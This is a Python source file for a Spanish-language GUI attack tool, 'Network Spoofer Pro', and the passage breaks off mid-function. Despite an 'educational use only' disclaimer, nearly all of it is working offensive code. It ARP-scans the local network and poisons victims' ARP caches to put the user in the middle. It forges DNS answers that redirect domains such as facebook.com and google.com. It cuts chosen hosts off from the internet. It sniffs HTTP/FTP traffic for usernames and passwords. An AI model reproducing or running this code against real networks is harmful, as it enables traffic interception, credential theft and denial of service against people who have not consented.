#!/usr/bin/env python3
"""
Network Spoofer Pro - Herramienta educativa de ARP/DNS Spoofing
ADVERTENCIA: Solo para uso educativo y pruebas autorizadas
"""

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, Toplevel, filedialog
from scapy.all import ARP, Ether, srp, send, sniff, DNS, DNSRR, IP, UDP, conf, get_if_addr, TCP, Raw
import threading
import time
import netifaces
import sys
import io
from datetime import datetime
from collections import defaultdict
import json


class Host:
    """Clase para representar un host objetivo"""
    def __init__(self, ip, mac, hostname=""):
        self.ip = ip
        self.mac = mac
        self.hostname = hostname
        self.activo = False
        self.paquetes_enviados = 0
        self.paquetes_interceptados = 0
        self.ultima_actividad = None
        self.hilo_arp = None
        self.sniffing = False


class NetworkSpooferPro:
    """Clase principal de la aplicación"""
    
    def __init__(self, root):
        self.root = root
        self.root.title("Network Spoofer Pro - Multi-Host Edition")
        self.root.geometry("1100x750")
        self.root.config(bg="#1e1e1e")
        
        # Variables globales
        self.hosts_objetivos = {}  # {ip: Host}
        self.hosts_escaneados = []
        self.dominios_falsos = {}
        self.gateway_ip = ""
        self.atacante_ip = ""
        self.mac_gateway = ""
        self.sniffing_global = False
        self.estadisticas = defaultdict(int)
        
        # Inicializar variables de widgets que pueden ser referenciadas antes de crearse
        self.label_hosts_activos = None
        self.label_paquetes = None
        self.label_estado = None
        self.log_text = None
        
        # Crear interfaz primero
        self.crear_menu()
        self.crear_interfaz()
        
        # Configuración de redirección de salida (después de crear log_text)
        sys.stdout = RedirectText(self.log_output)
        sys.stderr = RedirectText(self.log_output)
        
        # Inicializar
        self.actualizar_info_red()
    
    def crear_menu(self):
        """Crear barra de menú"""
        menu_bar = tk.Menu(self.root)
        
        # Menú Archivo
        archivo_menu = tk.Menu(menu_bar, tearoff=0)
        archivo_menu.add_command(label="Guardar Log", command=self.guardar_log)
        archivo_menu.add_command(label="Exportar Estadísticas", command=self.exportar_estadisticas)
        archivo_menu.add_separator()
        archivo_menu.add_command(label="Salir", command=self.salir_aplicacion)
        
        # Menú Herramientas
        herramientas_menu = tk.Menu(menu_bar, tearoff=0)
        herramientas_menu.add_command(label="Interceptor de Credenciales", command=self.abrir_interceptor_credenciales)
        herramientas_menu.add_command(label="Monitor de Tráfico", command=self.abrir_monitor_trafico)
        herramientas_menu.add_command(label="Configuración Avanzada", command=self.abrir_configuracion)
        
        # Menú Ayuda
        ayuda_menu = tk.Menu(menu_bar, tearoff=0)
        ayuda_menu.add_command(label="Manual de Uso", command=self.mostrar_ayuda)
        ayuda_menu.add_command(label="Acerca de", command=self.mostrar_acerca_de)
        
        menu_bar.add_cascade(label="Archivo", menu=archivo_menu)
        menu_bar.add_cascade(label="Herramientas", menu=herramientas_menu)
        menu_bar.add_cascade(label="Ayuda", menu=ayuda_menu)
        
        self.root.config(menu=menu_bar)
    
    def crear_interfaz(self):
        """Crear la interfaz principal"""
        # Estilos
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('Dark.TNotebook', background='#1e1e1e', borderwidth=0)
        style.configure('Dark.TNotebook.Tab', background='#2a2a2a', foreground='white', 
                       padding=[20, 10], font=('Consolas', 10))
        style.map('Dark.TNotebook.Tab', background=[('selected', '#444')])
        
        # Notebook principal
        self.notebook = ttk.Notebook(self.root, style='Dark.TNotebook')
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Tabs
        self.tab_escaneo = tk.Frame(self.notebook, bg="#1e1e1e")
        self.tab_ataque = tk.Frame(self.notebook, bg="#1e1e1e")
        self.tab_estadisticas = tk.Frame(self.notebook, bg="#1e1e1e")
        self.tab_logs = tk.Frame(self.notebook, bg="#1e1e1e")
        
        self.notebook.add(self.tab_escaneo, text="  Escaneo de Red  ")
        self.notebook.add(self.tab_ataque, text="  Ataque Multi-Host  ")
        self.notebook.add(self.tab_estadisticas, text="  Estadísticas  ")
        self.notebook.add(self.tab_logs, text="  Logs  ")
        
        # Crear contenido de cada tab
        self.crear_tab_escaneo()
        self.crear_tab_ataque()
        self.crear_tab_estadisticas()
        self.crear_tab_logs()
        
        # Barra de estado
        self.crear_barra_estado()
    
    def crear_tab_escaneo(self):
        """Tab de escaneo de red"""
        # Frame superior con información de red
        frame_info = tk.Frame(self.tab_escaneo, bg="#1e1e1e")
        frame_info.pack(fill=tk.X, padx=10, pady=10)
        
        estilo_label = {"bg": "#1e1e1e", "fg": "white", "font": ("Consolas", 10)}
        
        self.label_atacante = tk.Label(frame_info, text="Tu IP: Cargando...", **estilo_label)
        self.label_atacante.grid(row=0, column=0, sticky="w", padx=5)
        
        self.label_gateway = tk.Label(frame_info, text="Gateway: Cargando...", **estilo_label)
        self.label_gateway.grid(row=0, column=1, sticky="w", padx=5)
        
        self.label_interfaz = tk.Label(frame_info, text="Interfaz: " + conf.iface, **estilo_label)
        self.label_interfaz.grid(row=0, column=2, sticky="w", padx=5)
        
        # Frame de controles
        frame_controles = tk.Frame(self.tab_escaneo, bg="#1e1e1e")
        frame_controles.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Button(frame_controles, text="🔍 Escanear Red", command=self.escanear_red,
                 bg="#0066cc", fg="white", font=("Consolas", 11, "bold"),
                 activebackground="#0052a3", relief=tk.FLAT, padx=20, pady=8).pack(side=tk.LEFT, padx=5)
        
        tk.Button(frame_controles, text="⟳ Actualizar", command=self.actualizar_info_red,
                 bg="#444", fg="white", font=("Consolas", 10),
                 activebackground="#555", relief=tk.FLAT, padx=15, pady=8).pack(side=tk.LEFT, padx=5)
        
        tk.Button(frame_controles, text="✓ Seleccionar Todos", command=self.seleccionar_todos_hosts,
                 bg="#444", fg="white", font=("Consolas", 10),
                 activebackground="#555", relief=tk.FLAT, padx=15, pady=8).pack(side=tk.LEFT, padx=5)
        
        tk.Button(frame_controles, text="✗ Deseleccionar Todos", command=self.deseleccionar_todos_hosts,
                 bg="#444", fg="white", font=("Consolas", 10),
                 activebackground="#555", relief=tk.FLAT, padx=15, pady=8).pack(side=tk.LEFT, padx=5)
        
        # Frame de lista con scrollbar
        frame_lista = tk.Frame(self.tab_escaneo, bg="#1e1e1e")
        frame_lista.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        tk.Label(frame_lista, text="Hosts Encontrados (Selecciona los objetivos):",
                bg="#1e1e1e", fg="white", font=("Consolas", 11, "bold")).pack(anchor="w", pady=(0, 5))
        
        # Frame con scrollbar
        lista_frame = tk.Frame(frame_lista, bg="#2a2a2a")
        lista_frame.pack(fill=tk.BOTH, expand=True)
        
        scrollbar = tk.Scrollbar(lista_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.canvas_hosts = tk.Canvas(lista_frame, bg="#2a2a2a", highlightthickness=0,
                                      yscrollcommand=scrollbar.set)
        self.canvas_hosts.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.config(command=self.canvas_hosts.yview)
        
        self.frame_hosts_interno = tk.Frame(self.canvas_hosts, bg="#2a2a2a")
        self.canvas_hosts.create_window((0, 0), window=self.frame_hosts_interno, anchor="nw")
        
        self.frame_hosts_interno.bind("<Configure>", 
                                     lambda e: self.canvas_hosts.configure(scrollregion=self.canvas_hosts.bbox("all")))
    
    def crear_tab_ataque(self):
        """Tab de configuración de ataque"""
        # Frame de configuración de dominios
        frame_dominios = tk.LabelFrame(self.tab_ataque, text="Configuración de DNS Spoofing",
                                       bg="#1e1e1e", fg="white", font=("Consolas", 11, "bold"))
        frame_dominios.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Label(frame_dominios, text="Dominios a Spoofear (uno por línea o separados por coma):",
                bg="#1e1e1e", fg="white", font=("Consolas", 10)).pack(anchor="w", padx=10, pady=5)
        
        self.text_dominios = scrolledtext.ScrolledText(frame_dominios, height=4, width=70,
                                                       bg="#2a2a2a", fg="#00ff88",
                                                       insertbackground="#00ff88", font=("Consolas", 10))
        self.text_dominios.pack(padx=10, pady=5)
        self.text_dominios.insert("1.0", "example.com\nfacebook.com\ngoogle.com")
        
        # Frame de IP de redirección
        frame_redir = tk.Frame(frame_dominios, bg="#1e1e1e")
        frame_redir.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Label(frame_redir, text="Redirigir a IP:", bg="#1e1e1e", fg="white",
                font=("Consolas", 10)).pack(side=tk.LEFT, padx=(0, 10))
        
        self.entry_ip_redireccion = tk.Entry(frame_redir, width=20, bg="#2a2a2a", fg="#00ff88",
                                             insertbackground="#00ff88", font=("Consolas", 10))
        self.entry_ip_redireccion.pack(side=tk.LEFT)
        
        tk.Button(frame_redir, text="Usar mi IP", command=self.usar_mi_ip,
                 bg="#444", fg="white", font=("Consolas", 9),
                 activebackground="#555", relief=tk.FLAT, padx=10).pack(side=tk.LEFT, padx=10)
        
        # Frame de hosts seleccionados
        frame_seleccionados = tk.LabelFrame(self.tab_ataque, text="Hosts Seleccionados para Ataque",
                                           bg="#1e1e1e", fg="white", font=("Consolas", 11, "bold"))
        frame_seleccionados.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.text_hosts_seleccionados = scrolledtext.ScrolledText(frame_seleccionados, height=8,
                                                                  bg="#2a2a2a", fg="#00ff88",
                                                                  font=("Consolas", 10), state='disabled')
        self.text_hosts_seleccionados.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Botones de control
        frame_botones = tk.Frame(self.tab_ataque, bg="#1e1e1e")
        frame_botones.pack(fill=tk.X, padx=10, pady=10)
        
        # Frame con explicación
        frame_explicacion = tk.LabelFrame(self.tab_ataque, text="ℹ️  Tipos de Ataque",
                                         bg="#1e1e1e", fg="#00aaff", font=("Consolas", 10, "bold"))
        frame_explicacion.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        explicacion_texto = """
🌐 DNS Spoofing (Con Internet): Intercepta y redirige dominios específicos MANTENIENDO 
   el acceso general a internet. Requiere IP forwarding habilitado. Ideal para 
   redireccionar sitios específicos sin afectar el resto de la navegación.

🚫 Bloquear Internet: Elimina completamente el acceso a internet del host objetivo.
   Útil para pruebas de DoS o para demostrar vulnerabilidades ARP.
        """
        
        tk.Label(frame_explicacion, text=explicacion_texto, bg="#1e1e1e", fg="white",
                font=("Consolas", 9), justify=tk.LEFT).pack(padx=15, pady=10, anchor="w")
        
        self.btn_dns_spoofing = tk.Button(frame_botones, text="🌐 DNS Spoofing (Con Internet)",
                                     command=self.iniciar_dns_spoofing_con_internet,
                                     bg="#0066cc", fg="white", font=("Consolas", 11, "bold"),
                                     activebackground="#0052a3", relief=tk.FLAT, padx=25, pady=12)
        self.btn_dns_spoofing.pack(side=tk.LEFT, padx=5)
        
        self.btn_sin_internet = tk.Button(frame_botones, text="🚫 Bloquear Internet",
                                          command=self.bloquear_internet_multihost,
                                          bg="#ff6600", fg="white", font=("Consolas", 11, "bold"),
                                          activebackground="#dd5500", relief=tk.FLAT, padx=25, pady=12)
        self.btn_sin_internet.pack(side=tk.LEFT, padx=5)
        
        self.btn_detener = tk.Button(frame_botones, text="⏹ Detener Ataque",
                                     command=self.detener_ataque_multihost,
                                     bg="#cc0000", fg="white", font=("Consolas", 11, "bold"),
                                     activebackground="#aa0000", relief=tk.FLAT, padx=25, pady=12,
                                     state='disabled')
        self.btn_detener.pack(side=tk.LEFT, padx=5)
    
    def crear_tab_estadisticas(self):
        """Tab de estadísticas"""
        frame_stats = tk.Frame(self.tab_estadisticas, bg="#1e1e1e")
        frame_stats.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Estadísticas generales
        frame_general = tk.LabelFrame(frame_stats, text="Estadísticas Generales",
                                     bg="#1e1e1e", fg="white", font=("Consolas", 11, "bold"))
        frame_general.pack(fill=tk.X, pady=(0, 10))
        
        self.label_stats_general = tk.Label(frame_general, text="", bg="#1e1e1e", fg="white",
                                           font=("Consolas", 10), justify=tk.LEFT)
        self.label_stats_general.pack(padx=20, pady=15, anchor="w")
        
        # Estadísticas por host
        frame_hosts_stats = tk.LabelFrame(frame_stats, text="Estadísticas por Host",
                                         bg="#1e1e1e", fg="white", font=("Consolas", 11, "bold"))
        frame_hosts_stats.pack(fill=tk.BOTH, expand=True)
        
        self.text_stats_hosts = scrolledtext.ScrolledText(frame_hosts_stats, bg="#2a2a2a",
                                                          fg="#00ff88", font=("Consolas", 10))
        self.text_stats_hosts.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Botón de actualización
        tk.Button(frame_stats, text="⟳ Actualizar Estadísticas", command=self.actualizar_estadisticas,
                 bg="#444", fg="white", font=("Consolas", 10),
                 activebackground="#555", relief=tk.FLAT, padx=20, pady=8).pack(pady=10)
        
        # Actualizar estadísticas cada 2 segundos
        self.actualizar_estadisticas_periodico()
    
    def crear_tab_logs(self):
        """Tab de logs"""
        self.log_text = scrolledtext.ScrolledText(self.tab_logs, bg="#111", fg="#00ff88",
                                                  font=("Consolas", 10), state='disabled')
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Botones de control de logs
        frame_log_btns = tk.Frame(self.tab_logs, bg="#1e1e1e")
        frame_log_btns.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        tk.Button(frame_log_btns, text="🗑️ Limpiar Logs", command=self.limpiar_logs,
                 bg="#444", fg="white", font=("Consolas", 10),
                 activebackground="#555", relief=tk.FLAT, padx=15, pady=8).pack(side=tk.LEFT, padx=5)
        
        tk.Button(frame_log_btns, text="💾 Guardar Logs", command=self.guardar_log,
                 bg="#444", fg="white", font=("Consolas", 10),
                 activebackground="#555", relief=tk.FLAT, padx=15, pady=8).pack(side=tk.LEFT, padx=5)
    
    def crear_barra_estado(self):
        """Crear barra de estado inferior"""
        self.frame_estado = tk.Frame(self.root, bg="#2a2a2a", relief=tk.SUNKEN, bd=1)
        self.frame_estado.pack(fill=tk.X, side=tk.BOTTOM)
        
        self.label_estado = tk.Label(self.frame_estado, text="🔴 Detenido",
                                    bg="#2a2a2a", fg="#ff4444", font=("Consolas", 10, "bold"))
        self.label_estado.pack(side=tk.LEFT, padx=10, pady=5)
        
        self.label_hosts_activos = tk.Label(self.frame_estado, text="Hosts activos: 0",
                                           bg="#2a2a2a", fg="white", font=("Consolas", 10))
        self.label_hosts_activos.pack(side=tk.LEFT, padx=10)
        
        self.label_paquetes = tk.Label(self.frame_estado, text="Paquetes: 0",
                                      bg="#2a2a2a", fg="white", font=("Consolas", 10))
        self.label_paquetes.pack(side=tk.LEFT, padx=10)
    
    # ===== Funciones de red =====
    
    def habilitar_ip_forwarding(self):
        """Habilitar IP forwarding para permitir MITM sin bloquear internet"""
        try:
            import subprocess
            # Verificar estado actual
            with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
                estado_actual = f.read().strip()
            
            if estado_actual == '1':
                self.log_output("[✓] IP Forwarding ya está habilitado")
                return True
            
            # Habilitar IP forwarding
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], 
                         capture_output=True, check=True)
            self.log_output("[✓] IP Forwarding habilitado (necesario para DNS spoofing sin bloquear internet)")
            return True
        except Exception as e:
            self.log_output(f"[✗] Error al habilitar IP forwarding: {e}")
            messagebox.showwarning(
                "Advertencia",
                "No se pudo habilitar IP Forwarding.\n\n"
                "Para que el DNS spoofing funcione sin bloquear internet, ejecuta:\n"
                "sudo sysctl -w net.ipv4.ip_forward=1"
            )
            return False
    
    def verificar_ip_forwarding(self):
        """Verificar si IP forwarding está habilitado"""
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
                return f.read().strip() == '1'
        except:
            return False
    
    def actualizar_info_red(self):
        """Actualizar información de la red"""
        try:
            self.atacante_ip = get_if_addr(conf.iface)
            self.gateway_ip = self.obtener_gateway()
            self.mac_gateway = self.obtener_mac(self.gateway_ip)
            
            if hasattr(self, 'label_atacante') and self.label_atacante:
                self.label_atacante.config(text=f"Tu IP: {self.atacante_ip}")
            if hasattr(self, 'label_gateway') and self.label_gateway:
                self.label_gateway.config(text=f"Gateway: {self.gateway_ip}")
            if hasattr(self, 'label_interfaz') and self.label_interfaz:
                self.label_interfaz.config(text=f"Interfaz: {conf.iface}")
            
            self.log_output(f"[✓] Información de red actualizada")
        except Exception as e:
            self.log_output(f"[✗] Error al actualizar info de red: {e}")
    
    def obtener_gateway(self):
        """Obtener la IP del gateway"""
        try:
            gws = netifaces.gateways()
            return gws['default'][netifaces.AF_INET][0]
        except:
            return ""
    
    def obtener_mac(self, ip):
        """Obtener la MAC de una IP"""
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            result = srp(broadcast / arp_request, timeout=2, verbose=False)[0]
            return result[0][1].hwsrc if result else None
        except:
            return None
    
    def escanear_red(self):
        """Escanear la red en busca de hosts"""
        def escaneo_thread():
            self.hosts_escaneados.clear()
            
            # Limpiar frame de hosts
            for widget in self.frame_hosts_interno.winfo_children():
                widget.destroy()
            
            ip_base = ".".join(self.atacante_ip.split(".")[:-1]) + ".1/24"
            self.log_output(f"[~] Escaneando red {ip_base}...")
            self.actualizar_estado("🟡 Escaneando", "#ffaa00")
            
            try:
                arp = ARP(pdst=ip_base)
                ether = Ether(dst="ff:ff:ff:ff:ff:ff")
                packet = ether / arp
                result = srp(packet, timeout=3, verbose=False)[0]
                
                if not result:
                    self.log_output("[!] No se encontraron hosts.")
                    self.actualizar_estado("🔴 Detenido", "#ff4444")
                    return
                
                self.log_output(f"[✓] Se encontraron {len(result)} hosts:")
                
                for sent, received in result:
                    ip = received.psrc
                    mac = received.hwsrc
                    
                    # Evitar agregar el gateway y la propia IP
                    if ip == self.gateway_ip or ip == self.atacante_ip:
                        continue
                    
                    self.hosts_escaneados.append((ip, mac))
                    self.log_output(f"    {ip} - {mac}")
                    
                    # Crear checkbox para este host
                    var = tk.BooleanVar()
                    frame_host = tk.Frame(self.frame_hosts_interno, bg="#2a2a2a")
                    frame_host.pack(fill=tk.X, padx=10, pady=2)
                    
                    cb = tk.Checkbutton(frame_host, text=f"{ip} - {mac}",
                                       variable=var, bg="#2a2a2a", fg="#00ff88",
                                       selectcolor="#444", font=("Consolas", 10),
                                       activebackground="#2a2a2a", activeforeground="#00ff88")
                    cb.pack(side=tk.LEFT)
                    cb.var = var
                    cb.ip = ip
                    cb.mac = mac
                
                self.actualizar_estado("🔴 Detenido", "#ff4444")
                self.log_output(f"[✓] Escaneo completado. {len(self.hosts_escaneados)} hosts disponibles.")
                
            except Exception as e:
                self.log_output(f"[✗] Error al escanear: {e}")
                self.actualizar_estado("🔴 Error", "#ff4444")
        
        threading.Thread(target=escaneo_thread, daemon=True).start()
    
    def seleccionar_todos_hosts(self):
        """Seleccionar todos los hosts escaneados"""
        for widget in self.frame_hosts_interno.winfo_children():
            for child in widget.winfo_children():
                if isinstance(child, tk.Checkbutton):
                    child.var.set(True)
        self.log_output("[✓] Todos los hosts seleccionados")
    
    def deseleccionar_todos_hosts(self):
        """Deseleccionar todos los hosts"""
        for widget in self.frame_hosts_interno.winfo_children():
            for child in widget.winfo_children():
                if isinstance(child, tk.Checkbutton):
                    child.var.set(False)
        self.log_output("[✓] Todos los hosts deseleccionados")
    
    def usar_mi_ip(self):
        """Usar la IP del atacante para redirección"""
        self.entry_ip_redireccion.delete(0, tk.END)
        self.entry_ip_redireccion.insert(0, self.atacante_ip)
    
    # ===== Funciones de ataque =====
    
    def iniciar_dns_spoofing_con_internet(self):
        """Iniciar ataque ARP/DNS spoofing MANTENIENDO internet activo"""
        # Habilitar IP forwarding primero
        if not self.habilitar_ip_forwarding():
            respuesta = messagebox.askyesno(
                "IP Forwarding Deshabilitado",
                "IP Forwarding no está habilitado.\n\n"
                "Sin esto, las víctimas perderán acceso a internet.\n\n"
                "¿Deseas continuar de todos modos?"
            )
            if not respuesta:
                return
        
        # Obtener hosts seleccionados
        hosts_seleccionados = []
        for widget in self.frame_hosts_interno.winfo_children():
            for child in widget.winfo_children():
                if isinstance(child, tk.Checkbutton) and child.var.get():
                    hosts_seleccionados.append((child.ip, child.mac))
        
        if not hosts_seleccionados:
            messagebox.showerror("Error", "Por favor, selecciona al menos un host objetivo.")
            return
        
        # Obtener dominios
        dominios_texto = self.text_dominios.get("1.0", tk.END).strip()
        if not dominios_texto:
            messagebox.showerror("Error", "Por favor, introduce al menos un dominio.")
            return
        
        # Obtener IP de redirección
        ip_redireccion = self.entry_ip_redireccion.get().strip()
        if not ip_redireccion:
            ip_redireccion = self.atacante_ip
        
        # Preparar dominios
        self.dominios_falsos.clear()
        dominios = dominios_texto.replace('\n', ',').split(',')
        for dominio in dominios:
            dominio = dominio.strip()
            if dominio and not dominio.endswith("."):
                dominio += "."
            if dominio:
                self.dominios_falsos[dominio.encode()] = ip_redireccion
        
        # Iniciar ataque para cada host
        self.log_output(f"\n{'='*60}")
        self.log_output(f"[▶] INICIANDO DNS SPOOFING (CON INTERNET)")
        self.log_output(f"{'='*60}")
        self.log_output(f"Hosts objetivo: {len(hosts_seleccionados)}")
        self.log_output(f"Dominios a spoofear: {len(self.dominios_falsos)}")
        self.log_output(f"Redirección a: {ip_redireccion}")
        self.log_output(f"IP Forwarding: {'✓ Habilitado' if self.verificar_ip_forwarding() else '✗ Deshabilitado'}")
        self.log_output(f"{'='*60}\n")
        
        for ip, mac in hosts_seleccionados:
            if ip not in self.hosts_objetivos:
                host = Host(ip, mac)
                self.hosts_objetivos[ip] = host
            else:
                host = self.hosts_objetivos[ip]
            
            if not host.activo:
                host.sniffing = True
                host.activo = True
                host.hilo_arp = threading.Thread(target=self.arp_spoof_thread, 
                                                args=(host,), daemon=True)
                host.hilo_arp.start()
                self.log_output(f"[✓] DNS Spoofing iniciado contra {ip}")
        
        # Iniciar sniffer DNS global si no está activo
        if not self.sniffing_global:
            self.sniffing_global = True
            threading.Thread(target=self.dns_sniff_thread, daemon=True).start()
        
        # Actualizar interfaz
        self.actualizar_hosts_seleccionados()
        self.actualizar_estado(f"🟢 DNS Spoofing Activo ({len(self.hosts_objetivos)} hosts)", "#00ff00")
        self.btn_dns_spoofing.config(state='disabled')
        self.btn_detener.config(state='normal')
        self.btn_sin_internet.config(state='disabled')
    
    def detener_ataque_multihost(self):
        """Detener ataque en todos los hosts"""
        self.log_output(f"\n[⏹] Deteniendo ataques...")
        
        for ip, host in list(self.hosts_objetivos.items()):
            if host.activo:
                host.sniffing = False
                host.activo = False
                self.restaurar_arp(host)
                self.log_output(f"[✓] Ataque detenido y ARP restaurado para {ip}")
        
        self.sniffing_global = False
        self.hosts_objetivos.clear()
        
        self.actualizar_estado("🔴 Detenido", "#ff4444")
        self.btn_dns_spoofing.config(state='normal')
        self.btn_detener.config(state='disabled')
        self.btn_sin_internet.config(state='normal')
        self.actualizar_hosts_seleccionados()
        self.log_output("[✓] Todos los ataques detenidos\n")
    
    def bloquear_internet_multihost(self):
        """Bloquear internet a múltiples hosts (SIN IP forwarding)"""
        hosts_seleccionados = []
        for widget in self.frame_hosts_interno.winfo_children():
            for child in widget.winfo_children():
                if isinstance(child, tk.Checkbutton) and child.var.get():
                    hosts_seleccionados.append((child.ip, child.mac))
        
        if not hosts_seleccionados:
            messagebox.showerror("Error", "Por favor, selecciona al menos un host.")
            return
        
        # Advertir sobre bloqueo de internet
        respuesta = messagebox.askyesno(
            "Confirmar Bloqueo de Internet",
            f"Vas a BLOQUEAR internet para {len(hosts_seleccionados)} host(s).\n\n"
            "Los hosts seleccionados perderán completamente el acceso a internet.\n\n"
            "¿Deseas continuar?"
        )
        
        if not respuesta:
            return
        
        self.log_output(f"\n[🚫] BLOQUEANDO INTERNET A {len(hosts_seleccionados)} HOSTS")
        self.log_output("[!] ADVERTENCIA: Los hosts perderán acceso a internet")
        
        for ip, mac in hosts_seleccionados:
            if ip not in self.hosts_objetivos:
                host = Host(ip, mac)
                self.hosts_objetivos[ip] = host
            else:
                host = self.hosts_objetivos[ip]
            
            if not host.activo:
                host.sniffing = True
                host.activo = True
                host.hilo_arp = threading.Thread(target=self.bloqueo_internet_thread,
                                                args=(host,), daemon=True)
                host.hilo_arp.start()
                self.log_output(f"[✓] Internet bloqueado para {ip}")
        
        self.actualizar_hosts_seleccionados()
        self.actualizar_estado(f"🚫 Bloqueando Internet ({len(self.hosts_objetivos)} hosts)", "#ff6600")
        self.btn_dns_spoofing.config(state='disabled')
        self.btn_detener.config(state='normal')
        self.btn_sin_internet.config(state='disabled')
    
    def arp_spoof_thread(self, host):
        """Thread de ARP spoofing para un host específico"""
        while host.sniffing:
            try:
                # Envenenamiento bidireccional
                send(ARP(op=2, pdst=host.ip, psrc=self.gateway_ip, hwdst=host.mac), verbose=False)
                send(ARP(op=2, pdst=self.gateway_ip, psrc=host.ip, hwdst=self.mac_gateway), verbose=False)
                host.paquetes_enviados += 2
                host.ultima_actividad = datetime.now()
                self.estadisticas['paquetes_arp'] += 2
                time.sleep(2)
            except Exception as e:
                self.log_output(f"[✗] Error en ARP spoof para {host.ip}: {e}")
                break
    
    def bloqueo_internet_thread(self, host):
        """Thread de bloqueo de internet para un host"""
        while host.sniffing:
            try:
                # Solo envenenamos la tabla del host (no bidireccional)
                send(ARP(op=2, pdst=host.ip, psrc=self.gateway_ip, hwdst=host.mac), verbose=False)
                host.paquetes_enviados += 1
                host.ultima_actividad = datetime.now()
                self.estadisticas['paquetes_arp'] += 1
                time.sleep(2)
            except Exception as e:
                self.log_output(f"[✗] Error en bloqueo para {host.ip}: {e}")
                break
    
    def restaurar_arp(self, host):
        """Restaurar tabla ARP de un host"""
        try:
            send(ARP(op=2, pdst=self.gateway_ip, psrc=host.ip, 
                    hwsrc=host.mac, hwdst="ff:ff:ff:ff:ff:ff"), count=5, verbose=False)
            send(ARP(op=2, pdst=host.ip, psrc=self.gateway_ip,
                    hwsrc=self.mac_gateway, hwdst="ff:ff:ff:ff:ff:ff"), count=5, verbose=False)
        except Exception as e:
            self.log_output(f"[✗] Error al restaurar ARP para {host.ip}: {e}")
    
    def dns_sniff_thread(self):
        """Thread de sniffing DNS"""
        def dns_spoof(paquete):
            if paquete.haslayer(DNS) and paquete[DNS].qr == 0:
                dominio = paquete[DNS].qd.qname
                if dominio in self.dominios_falsos:
                    ip_origen = paquete[IP].src
                    
                    # Registrar en el host correspondiente
                    if ip_origen in self.hosts_objetivos:
                        self.hosts_objetivos[ip_origen].paquetes_interceptados += 1
                    
                    self.log_output(f"[+] Interceptado: {ip_origen} pidió {dominio.decode()}")
                    
                    respuesta = IP(dst=ip_origen, src=paquete[IP].dst) / \
                               UDP(dport=paquete[UDP].sport, sport=53) / \
                               DNS(id=paquete[DNS].id, qr=1, aa=1, qd=paquete[DNS].qd,
                                   an=DNSRR(rrname=dominio, ttl=5, rdata=self.dominios_falsos[dominio]))
                    send(respuesta, verbose=False)
                    self.log_output(f"[+] Redirigido a {self.dominios_falsos[dominio]}")
                    self.estadisticas['paquetes_dns'] += 1
        
        try:
            sniff(filter="udp port 53", prn=dns_spoof, store=0, stop_filter=lambda x: not self.sniffing_global)
        except Exception as e:
            self.log_output(f"[✗] Error en DNS sniffer: {e}")
    
    # ===== Herramientas adicionales =====
    
    def abrir_interceptor_credenciales(self):
        """Abrir ventana de interceptación de credenciales"""
        ventana_creds = Toplevel(self.root)
        ventana_creds.title("Interceptor de Credenciales")
        ventana_creds.geometry("800x500")
        ventana_creds.config(bg="#1e1e1e")
        
        tk.Label(ventana_creds, text="Interceptor de Credenciales HTTP/FTP",
                bg="#1e1e1e", fg="white", font=("Consolas", 12, "bold")).pack(pady=10)
        
        log_creds = scrolledtext.ScrolledText(ventana_creds, bg="#111", fg="#ff4444",
                                             font=("Consolas", 10))
        log_creds.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        def analizar_paquete(pkt):
            if pkt.haslayer(Raw):
                try:
                    carga = pkt[Raw].load.decode(errors="ignore")
                    palabras_clave = ["user", "username", "login", "pass", "password", 
                                     "email", "credential", "auth"]
                    
                    if any(palabra in carga.lower() for palabra in palabras_clave):
                        timestamp = datetime.now().strftime("%H:%M:%S")
                        ip_src = pkt[IP].src if pkt.haslayer(IP) else "N/A"
                        ip_dst = pkt[IP].dst if pkt.haslayer(IP) else "N/A"
                        
                        log_creds.insert(tk.END, f"\n{'='*70}\n")
                        log_creds.insert(tk.END, f"[{timestamp}] Posible credencial capturada\n")
                        log_creds.insert(tk.END, f"Origen: {ip_src} → Destino: {ip_dst}\n")
                        log_creds.insert(tk.END, f"Datos:\n{carga[:500]}\n")
                        log_creds.yview(tk.END)
                        self.estadisticas['credenciales_capturadas'] += 1
                except:
                    pass
        
        def iniciar_sniffer():
            sniff(filter="tcp port 21 or tcp port 80 or tcp port 8080", 
                 prn=analizar_paquete, store=0)
        
        threading.Thread(target=iniciar_sniffer, daemon=True).start()
        log_creds.insert(tk.END, "[~] Interceptor iniciado. Esperando tráfico HTTP/FTP...\n")
    
    def abrir_monitor_trafico(self):
        """Abrir monitor de tráfico en tiempo real"""
        ventana_monitor = Toplevel(self.root)
        ventana_monitor.title("Monitor de Tráfico")
        ventana_monitor.geometry("900x600")
        ventana_monitor.config(bg="#1e1e1e")
        
        tk.Label(ventana_monitor, text="Monitor de Tráfico en Tiempo Real",
                bg="#1e1e1e", fg="white", font=("Consolas", 12, "bold")).pack(pady=10)
        
        # Frame con filtros
        frame_filtros = tk.Frame(ventana_monitor, bg="#1e1e1e")
        frame_filtros.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Label(frame_filtros, text="Filtro:", bg="#1e1e1e", fg="white",
                font=("Consolas", 10)).pack(side=tk.LEFT, padx=5)
        
        var_http = tk.BooleanVar(value=True)
        var_dns = tk.BooleanVar(value=True)
        var_https = tk.BooleanVar(value=True)
        
        tk.Checkbutton(frame_filtros, text="HTTP", variable=var_http, bg="#1e1e1e",
